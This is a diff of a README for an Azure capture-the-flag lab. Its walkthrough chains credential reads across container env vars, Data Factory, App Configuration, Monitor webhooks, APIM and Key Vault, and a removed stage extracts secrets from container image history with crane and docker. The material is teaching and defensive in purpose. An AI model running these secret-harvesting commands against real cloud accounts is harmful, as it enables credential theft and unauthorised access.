@@ -20,24 +20,23 @@ identity, so the role grants are genuine.
 ## The ladder
 
 ```
-Bootstrap   public blob (anonymous)            --submit--> AcrPull + Reader on the Container Registry
-Stage 1     ACR image (AcrPull)                --submit--> Reader on the Container Instance
-Stage 2     Container Instance env (Reader)    --submit--> Reader on the Data Factory
-Stage 3     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
-Stage 4     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
-Stage 5     Monitor action group (Reader)      --submit--> Reader on the APIM service
-Stage 6     APIM named value (Reader)          --submit--> Key Vault Secrets User
+Bootstrap   public blob (anonymous)            --submit--> Reader on the Container Instance
+Stage 1     Container Instance env (Reader)    --submit--> Reader on the Data Factory
+Stage 2     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
+Stage 3     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
+Stage 4     Monitor action group (Reader)      --submit--> Reader on the APIM service
+Stage 5     APIM named value (Reader)          --submit--> Key Vault Secrets User
 Final       Key Vault secret (Secrets User)               the flag
 ```
 
 APIM is placed last (before the vault) on purpose: it is the slowest resource to
 provision, so it has the most time to be ready before a player reaches it.
 
-Each stage is one of the standalone labs' mechanisms (image-layer secrets,
-`container_instance_env`, `data_factory_linked_service`,
-`app_configuration_secrets`, `monitor_action_group`, `apim_named_value`) reusing
-their flags, wired together so the credential you read is the key to the next
-door.
+Each stage is one of the standalone labs' mechanisms (`container_instance_env`,
+`data_factory_linked_service`, `app_configuration_secrets`,
+`monitor_action_group`, `apim_named_value`) reusing their flags, wired together
+so the credential you read is the key to the next door. (The container-image
+secrets scenario has its own lab, `acr_image_secrets`.)
 
 ## Walkthrough
 
@@ -64,85 +63,7 @@ curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
 az login --username <attacker_upn> --password <attacker_password>
 ```
 
-### Stage 1 — ACR image (AcrPull on the registry)
-
-The bootstrap unlock grants AcrPull (+ Reader so the CLI can resolve the
-registry). The Cumulonimbus container has **no Docker daemon**, so use `crane`
-(a single-binary registry client, pre-installed in the image) to pull and
-inspect the image with just an ACR token:
-
-```bash
-ACR=<acr-name>
-TOKEN=$(az acr login -n $ACR --expose-token --query accessToken -o tsv)
-crane auth login $ACR.azurecr.io -u 00000000-0000-0000-0000-000000000000 -p "$TOKEN"
-
-IMG=$ACR.azurecr.io/cumulonimbus/app:latest
-
-# The REAL flag is recorded in the image history (a RUN wrote it into a layer,
-# a later RUN "deleted" it — but the command text and the layer remain):
-crane config $IMG | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
-
-# The decoy is the file that survives in the running filesystem:
-crane export $IMG - | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
-```
-
-The `DEPLOY_TOKEN` value (not the `legacy_deploy_token` decoy) is the flag.
-Submit it → unlocks **Reader on the Container Instance**.
-
-#### With Docker instead (on a host that has a daemon)
-
-The Cumulonimbus container has no Docker daemon, but if you run this stage from a
-machine that does, the equivalents are:
-
-| Purpose | crane (in-container) | Docker |
-|---|---|---|
-| Authenticate | `az acr login --expose-token` + `crane auth login` | `az acr login --name <acr>` |
-| Get the image | (implicit) | `docker pull <img>` |
-| Decoy (flattened filesystem) | `crane export <img> -` | `docker run --rm <img> cat /app/config/app.config` |
-| Real flag (image history) | `crane config <img>` | `docker history --no-trunc <img>` |
-
-```bash
-ACR=<acr-name>
-az acr login --name $ACR
-IMG=$ACR.azurecr.io/cumulonimbus/app:latest
-docker pull $IMG
-
-docker run --rm $IMG cat /app/config/app.config        # decoy
-docker history --no-trunc $IMG | grep -i deploy_token  # real flag
-```
-
-If the history shows the command truncated or elided (some BuildKit builds do),
-pull the layers apart — the "deleted" file still lives in its layer's tarball:
-
-```bash
-docker save $IMG -o img.tar && mkdir img && tar -xf img.tar -C img
-grep -rao 'CUMULONIMBUS{[^}]*}' img/   # finds the decoy and /root/.deploy_token
-```
-
-#### What the image history actually is
-
-A Docker/OCI image is a stack of read-only layers plus a **config JSON** that
-includes a `history` array — one entry per build step, recording the instruction
-that produced it (`created_by`), a timestamp, and size. For a shell-form `RUN`,
-`created_by` is the literal command that executed:
-
-```
-/bin/sh -c printf 'DEPLOY_TOKEN=CUMULONIMBUS{...}' > /root/.deploy_token
-```
-
-`docker history` / `crane config` just print that array. This is why an inline
-secret in a `RUN` leaks even after the file is removed: a later `rm` deletes the
-*file* from the final filesystem, but the *command text* (with the secret) is
-permanently recorded in the image's history — and the file itself still exists in
-the earlier layer's blob. Deleting a secret in a Dockerfile does **not** scrub it
-from the image.
-
-> Prefer other tools? `skopeo` and `oras` work the same way. To pull `crane`
-> yourself: `curl -sL
-> https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz
-> | tar -xz -C /usr/local/bin crane`.
-
-### Stage 2 — Container Instance env vars (Reader on the container)
+### Stage 1 — Container Instance env vars (Reader on the container)
 
 ```bash
 az container show -g <rg> -n <container-group> \
@@ -152,7 +73,7 @@ az container show -g <rg> -n <container-group> \
 `SECRET_FLAG` is the flag; `NEXT_HOP` names the Data Factory. Submit → unlocks
 **Reader on the Data Factory**.
 
-### Stage 3 — Data Factory linked service (Reader)
+### Stage 2 — Data Factory linked service (Reader)
 
 ```bash
 az extension add --name datafactory 2>/dev/null
@@ -163,7 +84,7 @@ az datafactory linked-service show -g <rg> --factory-name <adf-name> \
 The `AccountKey=` in the connection string is the flag; the `description` names
 the App Configuration store. Submit → unlocks **App Configuration Data Reader**.
 
-### Stage 4 — App Configuration (Data Reader)
+### Stage 3 — App Configuration (Data Reader)
 
 ```bash
 az appconfig kv list --name <config-store> --auth-mode login --all -o table
@@ -172,7 +93,7 @@ az appconfig kv list --name <config-store> --auth-mode login --all -o table
 `secrets/api-key` is the flag; `secrets/next-hop` names the Monitor action group.
 Submit the flag → unlocks **Reader on the Monitor action group**.
 
-### Stage 5 — Monitor action group webhook token (Reader)
+### Stage 4 — Monitor action group webhook token (Reader)
 
 ```bash
 az monitor action-group show -g <rg> -n <action-group> \
@@ -183,7 +104,7 @@ The `security-alerts` webhook URL contains the flag in its `token=` parameter;
 the `apim-pointer` webhook names the APIM service. Submit the flag → unlocks
 **Reader on the APIM service**.
 
-### Stage 6 — APIM named value (Reader on the APIM service)
+### Stage 5 — APIM named value (Reader on the APIM service)
 
 ```bash
 az apim nv show -g <rg> --service-name <apim-name> --named-value-id flag-key --query value -o tsv
@@ -217,11 +138,6 @@ deploy will fail at that step.
   non-secret named values, App Configuration key-values, container env vars,
   Data Factory inline connection strings, or Monitor webhook URLs. Use Key Vault
   references and mark sensitive values as secret.
-- Don't bake secrets into container images. A secret passed inline to a `RUN`
-  persists in the image **history** (the command text) and in the **layer**
-  even if a later step deletes the file — `rm` does not scrub it. Use BuildKit
-  `RUN --mount=type=secret`, multi-stage builds, or runtime injection (Key Vault
-  / mounted secrets), and scan images (trivy, trufflehog) before pushing.
 
 ## MITRE ATT&CK Mapping
 
